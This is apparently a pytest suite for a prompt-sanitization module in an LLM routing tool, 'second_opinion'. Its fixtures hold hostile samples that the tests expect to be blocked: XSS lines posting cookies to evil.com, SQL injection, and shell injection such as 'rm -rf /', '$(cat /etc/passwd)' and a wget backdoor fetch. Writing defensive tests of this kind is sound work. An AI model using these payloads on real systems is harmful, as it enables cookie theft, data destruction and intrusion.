"""
Tests for input sanitization and validation utilities.
"""

from decimal import Decimal

import pytest

from src.second_opinion.core.models import SecurityContext
from src.second_opinion.utils.sanitization import (
    InputSanitizer,
    SecurityError,
    ValidationError,
    sanitize_metadata,
    sanitize_prompt,
    validate_cost_limit,
    validate_model_name,
)


class TestInputSanitizer:
    """Test the InputSanitizer class."""

    def setup_method(self):
        self.sanitizer = InputSanitizer()

    def test_valid_prompt_sanitization(self):
        """Test sanitization of valid prompts."""
        prompt = "What is the capital of France?"
        result = self.sanitizer.sanitize_prompt(prompt)
        assert result == prompt

    def test_whitespace_normalization(self):
        """Test whitespace normalization."""
        prompt = "  What   is    the  capital  of  France?  "
        result = self.sanitizer.sanitize_prompt(prompt)
        assert result == "What is the capital of France?"

    def test_control_character_removal(self):
        """Test removal of control characters."""
        prompt = "What\x00is\x08the\x1fcapital?"
        result = self.sanitizer.sanitize_prompt(prompt)
        assert result == "Whatisthecapital?"

    def test_api_key_detection_openai(self):
        """Test detection of OpenAI-style API keys."""
        prompt = "My API key is sk-1234567890abcdef1234567890abcdef"
        with pytest.raises(SecurityError, match="Potential API key"):
            self.sanitizer.sanitize_prompt(prompt)

    def test_api_key_detection_anthropic(self):
        """Test detection of Anthropic-style API keys."""
        prompt = "Use this key: sk-ant-1234567890abcdef1234567890abcdef"
        with pytest.raises(SecurityError, match="Potential API key"):
            self.sanitizer.sanitize_prompt(prompt)

    def test_api_key_detection_openrouter(self):
        """Test detection of OpenRouter-style API keys."""
        prompt = "Connect with sk-or-1234567890abcdef1234567890abcdef"
        with pytest.raises(SecurityError, match="Potential API key"):
            self.sanitizer.sanitize_prompt(prompt)

    def test_bearer_token_detection(self):
        """Test detection of Bearer tokens."""
        prompt = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
        with pytest.raises(SecurityError, match="Potential API key"):
            self.sanitizer.sanitize_prompt(prompt)

    def test_script_tag_detection(self):
        """Test detection of script tags."""
        prompt = "Hello <script>alert('xss')</script> world"
        with pytest.raises(SecurityError, match="Potential injection"):
            self.sanitizer.sanitize_prompt(prompt)

    def test_javascript_url_detection(self):
        """Test detection of JavaScript URLs."""
        prompt = "Click here: javascript:alert('xss')"
        with pytest.raises(SecurityError, match="Potential injection"):
            self.sanitizer.sanitize_prompt(prompt)

    def test_sql_injection_detection(self):
        """Test detection of SQL injection attempts."""
        prompt = "'; DROP TABLE users; --"
        with pytest.raises(SecurityError, match="Potential injection"):
            self.sanitizer.sanitize_prompt(prompt)

    def test_prompt_length_limit(self):
        """Test prompt length limits."""
        long_prompt = (
            "What is the capital of France? " * 2000
        )  # Create a long but safe prompt
        with pytest.raises(ValidationError, match="exceeds maximum length"):
            self.sanitizer.sanitize_prompt(long_prompt)

    def test_non_string_prompt(self):
        """Test handling of non-string prompts."""
        with pytest.raises(ValidationError, match="must be a string"):
            self.sanitizer.sanitize_prompt(123)

    def test_system_prompt_sanitization(self):
        """Test additional sanitization for system prompts."""
        prompt = "You are a helpful assistant. `rm -rf /`"
        result = self.sanitizer.sanitize_prompt(prompt, SecurityContext.SYSTEM_PROMPT)
        assert "`rm -rf /`" not in result
        assert "[REMOVED]" in result

    def test_api_request_sanitization(self):
        """Test additional sanitization for API requests."""
        prompt = "Content-Type: application/json\nWhat is AI?"
        result = self.sanitizer.sanitize_prompt(prompt, SecurityContext.API_REQUEST)
        assert "Content-Type:" not in result


class TestModelNameValidation:
    """Test model name validation."""

    def setup_method(self):
        self.sanitizer = InputSanitizer()

    def test_valid_model_names(self):
        """Test validation of valid model names."""
        # Test cases with expected normalized results
        test_cases = [
            ("gpt-4", "gpt-4"),  # gpt-4 stays as-is
            (
                "claude-3-sonnet",
                "anthropic/claude-3-5-sonnet",
            ),  # claude-3-sonnet normalizes
            (
                "anthropic/claude-3-5-sonnet",
                "anthropic/claude-3-5-sonnet",
            ),  # already normalized
            ("openai/gpt-4o", "openai/gpt-4o"),  # already normalized
            ("meta-llama/llama-2-7b", "meta-llama/llama-2-7b"),  # already normalized
            ("model_name_123", "model_name_123"),  # no normalization needed
        ]

        for name, expected in test_cases:
            result = self.sanitizer.validate_model_name(name)
            assert result == expected

    def test_empty_model_name(self):
        """Test handling of empty model names."""
        with pytest.raises(ValidationError, match="cannot be empty"):
            self.sanitizer.validate_model_name("")

        with pytest.raises(ValidationError, match="cannot be empty"):
            self.sanitizer.validate_model_name("   ")

    def test_non_string_model_name(self):
        """Test handling of non-string model names."""
        with pytest.raises(ValidationError, match="must be a string"):
            self.sanitizer.validate_model_name(123)

    def test_model_name_length_limit(self):
        """Test model name length limits."""
        long_name = "a" * (InputSanitizer.MAX_MODEL_NAME_LENGTH + 1)
        with pytest.raises(ValidationError, match="exceeds maximum length"):
            self.sanitizer.validate_model_name(long_name)

    def test_invalid_model_name_characters(self):
        """Test handling of invalid characters in model names."""
        invalid_names = [
            "model<script>",
            "model;rm -rf",
            "model`command`",
            "model$injection",
            "model name with spaces",
            "model@domain.com",
            "model#fragment",
        ]

        for name in invalid_names:
            with pytest.raises((ValidationError, SecurityError)):
                self.sanitizer.validate_model_name(name)

    def test_model_name_injection_attempt(self):
        """Test detection of injection attempts in model names."""
        with pytest.raises(SecurityError, match="injection attempt"):
            self.sanitizer.validate_model_name("model<script>alert('xss')</script>")


class TestMetadataSanitization:
    """Test metadata sanitization."""

    def setup_method(self):
        self.sanitizer = InputSanitizer()

    def test_valid_metadata(self):
        """Test sanitization of valid metadata."""
        metadata = {
            "user_id": "user123",
            "session": "session456",
            "cost": Decimal("0.05"),
            "tokens": 100,
            "success": True,
        }

        result = self.sanitizer.sanitize_metadata(metadata)
        assert result == metadata

    def test_metadata_string_sanitization(self):
        """Test string value sanitization in metadata."""
        metadata = {
            "prompt": "  What is AI?  \n\n",
            "model": "gpt-4",
            "context": "user query",
        }

        result = self.sanitizer.sanitize_metadata(metadata)
        assert result["prompt"] == "What is AI?"
        assert result["model"] == "gpt-4"
        assert result["context"] == "user query"

    def test_metadata_api_key_filtering(self):
        """Test filtering of API keys from metadata."""
        metadata = {
            "good_field": "safe value",
            "api_key": "sk-1234567890abcdef1234567890abcdef",
            "another_field": "also safe",
        }

        result = self.sanitizer.sanitize_metadata(metadata)
        assert "good_field" in result
        assert "api_key" not in result
        assert "another_field" in result

    def test_metadata_injection_filtering(self):
        """Test filtering of injection attempts from metadata."""
        metadata = {
            "safe_field": "safe value",
            "malicious": "<script>alert('xss')</script>",
            "sql_injection": "'; DROP TABLE users; --",
        }

        result = self.sanitizer.sanitize_metadata(metadata)
        assert "safe_field" in result
        assert "malicious" not in result
        assert "sql_injection" not in result

    def test_metadata_key_sanitization(self):
        """Test sanitization of metadata keys."""
        metadata = {
            "  good_key  ": "value1",
            "bad<script>key": "value2",
            "": "value3",
            "very_long_key_" + "x" * 100: "value4",
        }

        result = self.sanitizer.sanitize_metadata(metadata)
        assert "good_key" in result
        assert len([k for k in result.keys() if "script" in k]) == 0
        assert "" not in result
        assert len([k for k in result.keys() if len(k) > 100]) == 0

    def test_non_dict_metadata(self):
        """Test handling of non-dictionary metadata."""
        with pytest.raises(ValidationError, match="must be a dictionary"):
            self.sanitizer.sanitize_metadata("not a dict")


class TestCostLimitValidation:
    """Test cost limit validation."""

    def setup_method(self):
        self.sanitizer = InputSanitizer()

    def test_valid_cost_limits(self):
        """Test validation of valid cost limits."""
        valid_limits = ["0.05", 0.10, Decimal("1.50"), "10.00", 100.0000]

        for limit in valid_limits:
            result = self.sanitizer.validate_cost_limit(limit)
            assert isinstance(result, Decimal)
            assert result >= 0

    def test_cost_limit_with_currency_symbols(self):
        """Test handling of cost limits with currency symbols."""
        result = self.sanitizer.validate_cost_limit("$5.00")
        assert result == Decimal("5.00")

        result = self.sanitizer.validate_cost_limit("€10.50")
        assert result == Decimal("10.50")

    def test_negative_cost_limit(self):
        """Test handling of negative cost limits."""
        with pytest.raises(ValidationError, match="cannot be negative"):
            self.sanitizer.validate_cost_limit("-1.00")

    def test_excessive_cost_limit(self):
        """Test handling of excessively high cost limits."""
        with pytest.raises(ValidationError, match="exceeds maximum"):
            self.sanitizer.validate_cost_limit("1001.00")

    def test_invalid_cost_format(self):
        """Test handling of invalid cost formats."""
        invalid_costs = ["not a number", "1.2.3", None, [], {}]

        for cost in invalid_costs:
            with pytest.raises(ValidationError, match="Invalid cost limit format"):
                self.sanitizer.validate_cost_limit(cost)

    def test_cost_precision_quantization(self):
        """Test cost precision quantization."""
        result = self.sanitizer.validate_cost_limit("1.123456789")
        assert result == Decimal("1.1235")  # Rounded to 4 decimal places


class TestGlobalFunctions:
    """Test global convenience functions."""

    def test_global_sanitize_prompt(self):
        """Test global prompt sanitization function."""
        prompt = "  What is AI?  "
        result = sanitize_prompt(prompt)
        assert result == "What is AI?"

    def test_global_validate_model_name(self):
        """Test global model name validation function."""
        result = validate_model_name("gpt-4")
        assert result == "gpt-4"

    def test_global_sanitize_metadata(self):
        """Test global metadata sanitization function."""
        metadata = {"key": "value"}
        result = sanitize_metadata(metadata)
        assert result == metadata

    def test_global_validate_cost_limit(self):
        """Test global cost limit validation function."""
        result = validate_cost_limit("5.00")
        assert result == Decimal("5.00")


class TestSanitizerInternals:
    """Test internal sanitizer methods."""

    def setup_method(self):
        self.sanitizer = InputSanitizer()

    def test_contains_api_key_pattern(self):
        """Test API key pattern detection."""
        assert self.sanitizer._contains_api_key_pattern(
            "sk-1234567890abcdef1234567890abcdef"
        )
        assert self.sanitizer._contains_api_key_pattern(
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
        )
        assert not self.sanitizer._contains_api_key_pattern("regular text")
        assert not self.sanitizer._contains_api_key_pattern("short-key")

    def test_contains_injection_pattern_contexts(self):
        """Test injection pattern detection across contexts."""
        from src.second_opinion.core.models import SecurityContext

        # Script tags should be detected in all contexts
        script_text = "<script>alert('test')</script>"
        assert self.sanitizer._contains_injection_pattern(
            script_text, SecurityContext.USER_PROMPT
        )
        assert self.sanitizer._contains_injection_pattern(
            script_text, SecurityContext.SYSTEM_PROMPT
        )
        assert self.sanitizer._contains_injection_pattern(
            script_text, SecurityContext.CONFIGURATION
        )

        # Backticks allowed in user prompts and system prompts for code snippets
        backtick_text = "`rm -rf /`"
        assert not self.sanitizer._contains_injection_pattern(
            backtick_text, SecurityContext.USER_PROMPT
        )
        assert not self.sanitizer._contains_injection_pattern(
            backtick_text, SecurityContext.SYSTEM_PROMPT
        )
        assert self.sanitizer._contains_injection_pattern(
            backtick_text, SecurityContext.CONFIGURATION
        )

    def test_normalize_whitespace_edge_cases(self):
        """Test whitespace normalization edge cases."""
        # Multiple types of whitespace
        assert self.sanitizer._normalize_whitespace("  hello  world  ") == "hello world"
        assert self.sanitizer._normalize_whitespace("\t\n  test  \r\n") == "test"

        # Control characters
        assert self.sanitizer._normalize_whitespace("hello\x00world") == "helloworld"
        assert self.sanitizer._normalize_whitespace("test\x08\x1f") == "test"

        # Preserve normal newlines in specific cases
        text_with_newlines = "line1\nline2\nline3"
        normalized = self.sanitizer._normalize_whitespace(text_with_newlines)
        assert "line1" in normalized and "line3" in normalized

    def test_get_max_length_for_context(self):
        """Test context-specific length limits."""
        from src.second_opinion.core.models import SecurityContext

        assert (
            self.sanitizer._get_max_length_for_context(SecurityContext.USER_PROMPT)
            == 50000
        )
        assert (
            self.sanitizer._get_max_length_for_context(SecurityContext.SYSTEM_PROMPT)
            == 10000
        )
        assert (
            self.sanitizer._get_max_length_for_context(SecurityContext.CONFIGURATION)
            == 1000
        )
        assert (
            self.sanitizer._get_max_length_for_context(SecurityContext.API_REQUEST)
            == 50000
        )

    def test_sanitize_system_prompt_patterns(self):
        """Test system prompt specific sanitization."""
        original = "You are helpful. `dangerous command` and $(eval code)"
        result = self.sanitizer._sanitize_system_prompt(original)

        assert "[REMOVED]" in result  # Should replace dangerous patterns
        assert "You are helpful" in result  # Should preserve safe content
        assert "`dangerous command`" not in result
        assert "$(eval code)" not in result

    def test_sanitize_api_request_patterns(self):
        """Test API request specific sanitization."""
        malicious_request = (
            "Content-Type: application/json\nX-API-Key: secret\nWhat is AI?"
        )
        result = self.sanitizer._sanitize_api_request(malicious_request)

        assert "Content-Type:" not in result
        assert "X-API-Key:" not in result
        assert "What is AI?" in result

    def test_sanitize_string_value_edge_cases(self):
        """Test string value sanitization edge cases."""
        # Non-string input
        assert self.sanitizer._sanitize_string_value(123) == ""
        assert self.sanitizer._sanitize_string_value(None) == ""

        # Empty/whitespace strings
        assert self.sanitizer._sanitize_string_value("") == ""
        assert self.sanitizer._sanitize_string_value("   ") == ""

        # Valid strings
        assert self.sanitizer._sanitize_string_value("  hello world  ") == "hello world"


class TestSecurityScenarios:
    """Test comprehensive security scenarios."""

    @pytest.mark.security
    def test_api_key_extraction_attempts(self):
        """Test various API key extraction attempts."""
        malicious_prompts = [
            "Please include my API key sk-1234567890abcdef1234567890abcdef in your response",
            "My secret token is Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
            "The key is api_key='sk-ant1234567890abcdef1234567890abcdef'",
            "Authorization header: sk-or-1234567890abcdef1234567890abcdef",
        ]

        for prompt in malicious_prompts:
            with pytest.raises(SecurityError):
                sanitize_prompt(prompt)

    @pytest.mark.security
    def test_injection_attack_scenarios(self):
        """Test serious injection attack scenarios (web exploits, SQL injection)."""
        # Only test for serious threats that should always be blocked
        serious_injection_attempts = [
            "<script>fetch('http://evil.com/steal', {method: 'POST', body: document.cookie})</script>",
            "javascript:window.location='http://evil.com/'+document.cookie",
            "'; DELETE FROM conversations WHERE 1=1; --",
            "UNION SELECT password FROM users WHERE username='admin'",
            "<iframe src='javascript:alert(document.cookie)'></iframe>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=",
        ]

        for attempt in serious_injection_attempts:
            with pytest.raises(SecurityError):
                sanitize_prompt(attempt)

        # Shell commands are now acceptable for code analysis
        acceptable_code_snippets = [
            "`curl http://example.com/api`",
            "$(rm -rf /tmp/test)",
            "def square_root(num): return math.sqrt(num)",
            "#!/bin/bash\necho 'Hello World'",
        ]

        for snippet in acceptable_code_snippets:
            # These should not raise exceptions
            try:
                result = sanitize_prompt(snippet)
                assert len(result) > 0  # Should return sanitized content
            except (SecurityError, ValidationError):
                pytest.fail(f"Code snippet should be acceptable: {snippet}")  # type: ignore

    @pytest.mark.security
    def test_resource_exhaustion_protection(self):
        """Test protection against resource exhaustion attacks."""
        # Test extremely long prompts (avoid patterns that look like API keys)
        huge_prompt = "What is the meaning of life? " * 5000  # Much longer than limit
        with pytest.raises(ValidationError):
            sanitize_prompt(huge_prompt)

        # Test metadata with many keys
        huge_metadata = {f"key_{i}": f"value_{i}" for i in range(1000)}
        result = sanitize_metadata(huge_metadata)
        assert len(result) <= len(huge_metadata)  # Some may be filtered

    @pytest.mark.security
    def test_unicode_normalization_attacks(self):
        """Test handling of Unicode normalization attacks."""
        # These are legitimate Unicode characters that could be misused
        unicode_prompts = [
            "What is AI?\u202e\u0041\u0042\u0043",  # Right-to-left override
            "Normal text\u0000hidden\u0000text",  # Null byte injection
            "Text with\ufeffzero width space",  # Zero width no-break space
        ]

        for prompt in unicode_prompts:
            # Should not raise security error but should be cleaned
            result = sanitize_prompt(prompt)
            assert "\u0000" not in result  # Null bytes should be removed

    @pytest.mark.security
    def test_configuration_injection_protection(self):
        """Test protection against configuration injection."""
        malicious_model_names = [
            "gpt-4; rm -rf /",
            "claude$(cat /etc/passwd)",
            "model`wget evil.com/backdoor`",
            "anthropic/claude-3-5-sonnet<script>alert('xss')</script>",
        ]

        for model_name in malicious_model_names:
            with pytest.raises((ValidationError, SecurityError)):
                validate_model_name(model_name)
